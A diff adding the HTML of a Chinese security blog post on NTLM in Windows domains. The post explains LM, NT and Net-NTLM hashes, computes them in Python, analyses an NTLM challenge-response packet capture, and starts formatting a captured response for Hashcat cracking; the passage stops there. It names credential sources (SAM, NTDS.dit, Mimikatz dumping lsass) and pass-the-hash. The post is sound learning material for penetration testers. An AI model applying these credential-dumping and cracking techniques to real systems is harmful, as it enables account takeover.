@@ -1,0 +1,1105 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  
+    <link rel="canonical" href="https://www.dr0n.top/posts/3f5b8fbe/"/>
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="dr0n">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="LM Hash 和 NTLM Hash 和 Net-NTLM hash在Windows系统中，身份验证通常使用 NTLM 协议，NTLM 协议不会直接传输明文密码，而是基于密码的哈希值进行质询-响应认证。这些哈希值由系统 API（如 LsaLogonUser）根据用户密码生成  Windows 中存在两种主要的本地存储哈希： LM Hash（LAN Manager Hash） NT Hash（也称">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透学习(NTLM篇)">
+<meta property="og:url" content="https://www.dr0n.top/posts/3f5b8fbe/index.html">
+<meta property="og:site_name" content="Dr0n&#39;s blog">
+<meta property="og:description" content="LM Hash 和 NTLM Hash 和 Net-NTLM hash在Windows系统中，身份验证通常使用 NTLM 协议，NTLM 协议不会直接传输明文密码，而是基于密码的哈希值进行质询-响应认证。这些哈希值由系统 API（如 LsaLogonUser）根据用户密码生成  Windows 中存在两种主要的本地存储哈希： LM Hash（LAN Manager Hash） NT Hash（也称">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-4.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-18.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-19.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-11.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-12.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-13.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-14.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-15.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-16.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-17.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-5.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-6.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-7.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-9.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-8.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-10.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-2.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-3.png">
+<meta property="article:published_time" content="2025-06-28T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-04T14:09:41.945Z">
+<meta property="article:author" content="dr0n">
+<meta property="article:tag" content="总结">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="域">
+<meta property="article:tag" content="NTLM">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ntlm-4.png">
+  
+  
+  
+  <title>域渗透学习(NTLM篇) - Dr0n&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"e509bf56906f797e00a96ebece6ea445","google":{"measurement_id":"G-BLJ2TG3Q9T"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?e509bf56906f797e00a96ebece6ea445";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-BLJ2TG3Q9T", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', 'G-BLJ2TG3Q9T');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dr0n&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>时间轴</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://awd.dr0n.top/" target="_self">
+                <i class="iconfont icon-docker"></i>
+                <span>awd</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codepen-fill"></i>
+                <span>tools</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://dr0n1.github.io/CyberChef/" target="_self">
+                    
+                    <span>CyberChef</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://dr0n1.github.io/emoji-aes/" target="_self">
+                    
+                    <span>emoji-aes</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/fluid-bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="域渗透学习(NTLM篇)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        dr0n
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-28 12:00" pubdate>
+          2025年6月28日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">域渗透学习(NTLM篇)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="LM-Hash-和-NTLM-Hash-和-Net-NTLM-hash"><a href="#LM-Hash-和-NTLM-Hash-和-Net-NTLM-hash" class="headerlink" title="LM Hash 和 NTLM Hash 和 Net-NTLM hash"></a>LM Hash 和 NTLM Hash 和 Net-NTLM hash</h1><p>在Windows系统中，身份验证通常使用 NTLM 协议，NTLM 协议不会直接传输明文密码，而是基于密码的哈希值进行质询-响应认证。这些哈希值由系统 API（如 LsaLogonUser）根据用户密码生成</p>
+<ul>
+<li>Windows 中存在两种主要的本地存储哈希：<ul>
+<li>LM Hash（LAN Manager Hash）</li>
+<li>NT Hash（也称 NTLM Hash）</li>
+</ul>
+</li>
+<li>在渗透测试中，通常可通过以下途径获取这些哈希：<ul>
+<li>从本地的 SAM 文件 (C:\Windows\System32\config\SAM) 中提取</li>
+<li>从域控制器的 NTDS.dit 文件 (C:\Windows\NTDS\NTDS.dit) 中提取</li>
+<li>使用工具（如 Mimikatz）从内存中读取 lsass.exe 进程，获取已登录用户的 NT Hash</li>
+</ul>
+</li>
+<li>如果攻击者窃取了这些<strong>本地存储的哈希值</strong>，就可以通过 传递哈希（Pass-the-Hash）技术直接模拟用户身份，而无需知道原始密码或重新计算哈希</li>
+</ul>
+<h2 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a>LM hash</h2><p>全称是LAN Manager Hash, windows最早使用的加密算法，由IBM设计。密码会被转为大写并限制为 14 个字符。自 Windows Vista 和 Windows Server 2008 起，LM Hash 默认被禁用。如果密码长度超过 15 个字符，也无法生成 LM Hash</p>
+<p>python脚本实现的 LM Hash 计算：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> pyDes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 使用 DES 算法进行加密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">DesEncrypt</span>(<span class="hljs-params">data_str, des_key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用 DES ECB 模式对指定字符串进行加密</span><br><span class="hljs-string">    :param data_str: 明文数据 (字符串)</span><br><span class="hljs-string">    :param des_key: 16 进制字符串表示的 DES 密钥 (16 个字符)</span><br><span class="hljs-string">    :return: 加密后的 16 进制字符串</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 将十六进制的密钥转换为二进制字节</span><br>    k = des(binascii.unhexlify(des_key), ECB, pad=<span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># 将明文字符串转为 bytes，再加密</span><br>    encrypted_data = k.encrypt(data_str.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    <span class="hljs-comment"># 返回加密后的十六进制字符串</span><br>    <span class="hljs-keyword">return</span> binascii.hexlify(encrypted_data).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">group_just</span>(<span class="hljs-params">length, text</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将 56bit 的比特流拆分为 7bit 一组，每组补充一个 0 变为 8bit，最后拼接成十六进制字符串</span><br><span class="hljs-string">    :param length: 每组的比特长度 (7)</span><br><span class="hljs-string">    :param text: 二进制字符串</span><br><span class="hljs-string">    :return: 转换后的十六进制字符串</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 将二进制流按 7bit 分组</span><br>    text_area = re.findall(<span class="hljs-string">r&#x27;.&#123;%d&#125;&#x27;</span> % <span class="hljs-built_in">int</span>(length), text)<br>    <span class="hljs-comment"># 每组末尾补一个 &#x27;0&#x27; 变成 8bit</span><br>    text_area_padding = [i + <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text_area]<br>    <span class="hljs-comment"># 拼接成完整的二进制字符串</span><br>    hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(text_area_padding)<br>    <span class="hljs-comment"># 转换为十六进制并去掉 Python 可能附加的 &#x27;L&#x27;</span><br>    hex_int = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(hex_str, <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:].rstrip(<span class="hljs-string">&quot;L&quot;</span>)<br>    <span class="hljs-comment"># 如果结果为 &#x27;0&#x27;，补齐为 16 个 0</span><br>    <span class="hljs-keyword">if</span> hex_int == <span class="hljs-string">&#x27;0&#x27;</span>:<br>        hex_int = <span class="hljs-string">&#x27;0000000000000000&#x27;</span><br>    <span class="hljs-keyword">return</span> hex_int<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lm_hash</span>(<span class="hljs-params">password</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    计算 Windows LM Hash</span><br><span class="hljs-string">    1. 密码转为大写，编码为十六进制，补齐 14 字节 (28 个十六进制字符)</span><br><span class="hljs-string">    2. 分成两段，每段 7 字节 (14 个十六进制字符)</span><br><span class="hljs-string">    3. 每段转换成比特流，补齐到 56bit</span><br><span class="hljs-string">    4. 每 7bit 转为 8bit 并补 0，形成 DES 密钥</span><br><span class="hljs-string">    5. 使用 DES 加密固定字符串 &quot;KGS!@#$%&quot;</span><br><span class="hljs-string">    6. 拼接两个加密结果得到最终 LM Hash</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 转为大写并编码为十六进制，不足 14 字节用 0 填充</span><br>    pass_hex = binascii.hexlify(password.upper().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>).ljust(<span class="hljs-number">28</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-comment"># 拆分为左右两段，每段 7 字节</span><br>    left_str = pass_hex[:<span class="hljs-number">14</span>]<br>    right_str = pass_hex[<span class="hljs-number">14</span>:]<br>    <span class="hljs-comment"># 转换为二进制字符串并补齐到 56 位</span><br>    left_stream = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(left_str, <span class="hljs-number">16</span>)).lstrip(<span class="hljs-string">&#x27;0b&#x27;</span>).rjust(<span class="hljs-number">56</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    right_stream = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(right_str, <span class="hljs-number">16</span>)).lstrip(<span class="hljs-string">&#x27;0b&#x27;</span>).rjust(<span class="hljs-number">56</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-comment"># 每 7bit 补 0 并转换为十六进制字符串</span><br>    left_stream = group_just(<span class="hljs-number">7</span>, left_stream)<br>    right_stream = group_just(<span class="hljs-number">7</span>, right_stream)<br>    <span class="hljs-comment"># DES 加密固定字符串</span><br>    left_lm = DesEncrypt(<span class="hljs-string">&#x27;KGS!@#$%&#x27;</span>, left_stream)<br>    right_lm = DesEncrypt(<span class="hljs-string">&#x27;KGS!@#$%&#x27;</span>, right_stream)<br>    <span class="hljs-comment"># 拼接两个部分得到最终 LM Hash</span><br>    <span class="hljs-keyword">return</span> left_lm + right_lm<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 测试用例</span><br>    hash_value = lm_hash(<span class="hljs-string">&quot;Qwer1234&quot;</span>)<br>    <span class="hljs-built_in">print</span>(hash_value)<br><br><span class="hljs-comment"># 1319b0fa23c89f2dff17365faf1ffe89</span><br></code></pre></td></tr></table></figure>
+
+<p>LM hash加密方式存在的缺点：</p>
+<ol>
+<li>密码不区分大小写，且长度最大只能为14个字符</li>
+<li>des的key是固定的</li>
+<li>如果明文密码长度小于7位，第二个分组的加密结果一定是：aad3b435b51404ee</li>
+</ol>
+<h2 id="NT-Hash-NTLM-Hash"><a href="#NT-Hash-NTLM-Hash" class="headerlink" title="NT Hash(NTLM Hash)"></a>NT Hash(NTLM Hash)</h2><p>LM Hash的缺点非常明显，所以微软于1993年在Windows NT 3.1中引入了NTLM协议，使用 MD4 算法对用户密码（Unicode 编码）进行哈希，是当前 NTLM 协议主要使用的哈希</p>
+<p>例如计算一个明文密码 Qwer1234，有以下几步</p>
+<ol>
+<li>To Hex: <code>5177657231323334</code></li>
+<li>转换为其对应的 Unicode 编码的十六进制值(小端序)：<code>51007700650072003100320033003400</code></li>
+<li>当作hex字符串进行MD4加密：<code>91ff0fb948167eb4d080b5330686c02f</code></li>
+</ol>
+<p>python 实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib,binascii<br><br><span class="hljs-built_in">print</span>(binascii.hexlify(hashlib.new(<span class="hljs-string">&quot;md4&quot;</span>, <span class="hljs-string">&quot;Qwer1234&quot;</span>.encode(<span class="hljs-string">&quot;utf-16le&quot;</span>)).digest()))<br><br><span class="hljs-comment"># b&#x27;91ff0fb948167eb4d080b5330686c02f&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>可以看到与mimikatz抓到的值一样</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-4.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Net-NTLM-hash"><a href="#Net-NTLM-hash" class="headerlink" title="Net-NTLM hash"></a>Net-NTLM hash</h2><p>前面提到的 LM Hash 和 NTLM Hash 是 Windows 系统本地存储用户凭据时使用的哈希值</p>
+<p>而 Net-NTLM Hash 通常指在网络环境下，NTLM 协议进行质询-响应认证时生成的认证数据（哈希响应），它与本地存储的 NTLM Hash 并不完全相同</p>
+<h1 id="NTLM身份认证"><a href="#NTLM身份认证" class="headerlink" title="NTLM身份认证"></a>NTLM身份认证</h1><p>Windows 的 NTLM 认证就是利用 NTLM Hash 进行的认证，可以分为 本地认证 和 网络认证 两种方式。NTLM 的网络认证，既可用于域内的认证服务，又可用于工作组环境。NTLM 有 NTLMv1 、NTLMv2 、NTLMsession v2 三个版本，目前使用最多的是NTLMv2版本</p>
+<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><p>本地认证流程如下：</p>
+<ol>
+<li>用户通过 winlogon.exe（Windows NT 用户登录程序）输入密码</li>
+<li>winlogon.exe 将明文密码传递给 lsass.exe（Local Security Authority Subsystem Service，本地安全子系统服务），负责处理 Windows 的本地安全策略和身份验证</li>
+<li>lsass.exe 会暂时存储明文密码，并将其与 SAM（Security Account Manager）数据库中的哈希值进行比对</li>
+<li>若比对成功，用户即可登录系统；否则登录失败</li>
+</ol>
+<h2 id="工作组-域认证"><a href="#工作组-域认证" class="headerlink" title="工作组&#x2F;域认证"></a>工作组&#x2F;域认证</h2><p>NTLM认证采用质询&#x2F;应答（Challenge&#x2F;Response）的消息交换模式，流程如下：</p>
+<ol>
+<li>协商 主要用于确认双方协议版本(NTLM v1&#x2F;NTLM V2)</li>
+<li>质询 就是挑战（Challenge）&#x2F;响应（Response）认证机制起作用的范畴。</li>
+<li>验证 验证主要是在质询完成后，验证结果，是认证的最后一步。</li>
+</ol>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-18.png" srcset="/img/loading.gif" lazyload alt="工作组"></p>
+<p>域内的流程是一样的，不过是身份验证部分交给了DC来进行</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-19.png" srcset="/img/loading.gif" lazyload alt="域"></p>
+<h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>IP：172.16.30.33<br>域：xx.com<br>账号密码：aaa&#x2F;Qwer1234</p>
+<p>域内客户端通过命令连接服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\172.16.30.33 /u:xx\aaa Qwer1234<br></code></pre></td></tr></table></figure>
+
+<p>前几个是smb协商版本的包，这里主要看16-19，对应NTLM认证的几个步骤(可以用smb2 或者 ntlmssp 筛选)</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-11.png" srcset="/img/loading.gif" lazyload></p>
+<p>16：NTLMSSP_NEGOTIATE Request 发送一些版本信息给服务端协商协议版本</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-12.png" srcset="/img/loading.gif" lazyload></p>
+<p>17：NTLMSSP_NEGOTIATE Response 返回 NTLMSSP_Challenge 包含一个16位随机数Challenge，例子中的是<code>387676d184713b48</code></p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-13.png" srcset="/img/loading.gif" lazyload></p>
+<p>18：客户端接收到Challenge之后，在本地使用用户 NTLM Hash 与 Challenge 进行加密运算得到 Response，将 Response，username，Challenge 发给服务器</p>
+<p>消息中的Response是最关键的部分，因为它向服务器证明客户端用户已经知道帐户密码</p>
+<blockquote>
+<p>NTLMv2 Client challenge： 客户端生成的随机数，与服务器提供的 Server Challenge 一起参与响应值计算，用于确保每次认证请求的唯一性<br>MIC： 消息完整性码，用于确保消息在传输过程中未被篡改。它基于协商的 Session Key 计算，保证数据完整性<br>session_key： 由 Master Key 派生而来的会话密钥，用于签名（Sign）和可选的消息加密（Seal），确保数据完整性与保密性<br>NTProofStr：是通过 HMAC-MD5 算法 计算得到的 16 字节摘要，用于证明客户端确实拥有用户的密码</p>
+</blockquote>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-14.png" srcset="/img/loading.gif" lazyload></p>
+<p>19：第四个请求包表示验证通过</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-15.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果使用错误的用户名密码时，如图：<code>Error: STATUS_LOGON_FAILURE</code></p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-16.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<p>下面，使用Hashcat对该Net-NTLM hash进行破解</p>
+<p>组成格式为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text"># Net-NTLM Hash v2的格式为(challenge-&gt;NTLM Server Challenge / HMAC-MD5-&gt;NTProofStr  /  blob-&gt;Response去掉NTProofStr的后半部分)：<br>username::domain:challenge:HMAC-MD5:blob<br><br># Net-NTLM Hash v1的格式为<br>username::hostname:LM response:NTLM response:challenge<br></code></pre></td></tr></table></figure>
+
+
+<p>组成完整的数据(这里注意域名需要小写，我之前复制成了大写导致一直爆破不出来，踩了个坑)</p>
